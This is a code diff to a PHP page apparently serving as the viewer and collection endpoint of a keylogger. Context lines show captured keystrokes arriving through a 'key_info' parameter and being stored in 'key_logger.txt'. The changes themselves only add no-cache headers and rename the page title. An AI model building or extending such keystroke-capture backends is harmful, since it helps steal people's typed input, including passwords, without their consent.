@@ -1,5 +1,10 @@
 <?php
 
+// remove cache
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Cache-Control: post-check=0, pre-check=0", false);
+header("Pragma: no-cache");
+
 $path_to_file_text = "./key_logger.txt";
 
 // get the key and read the file
@@ -22,7 +27,12 @@ if (isset($_GET['key_info'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Key Logger</title>
+
+    <!-- remove cache -->
+    <meta http-equiv="expires" content="Sun, 01 Jan 2014 00:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <title>Key Logger Interface</title>
 
     <link rel="stylesheet" type="text/css" href="./assets/css/style.css" />
 
@@ -39,12 +49,12 @@ if (isset($_GET['key_info'])) {
         </ul>
     </nav>
 
-    <h1>Key logger</h1>
+    <h1>Key Logger Interface</h1>
 
     <button type="button" id="btn-auto-refresh"></button>
     <div id="get-text-logger"></div>
 
-   
+
 
 
 </body>
